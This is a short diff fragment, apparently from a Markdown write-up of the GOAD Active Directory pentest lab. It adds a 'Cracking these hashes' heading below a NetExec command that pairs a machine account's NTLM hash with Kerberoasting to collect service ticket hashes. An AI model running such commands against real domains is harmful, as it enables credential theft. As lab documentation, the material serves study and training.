@@ -296,7 +296,9 @@ fixed it, we got users tgs hashes.
 ┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/GOAD]
 └─$ nxc ldap ips.txt -u 'SQL$' -H b0bf9268ebc9c75d9c13f25f5a33e751 --kerberoasting hashes.asreproast
 ```
+<br></br>
 
+- Cracking these hashes
 
 
 
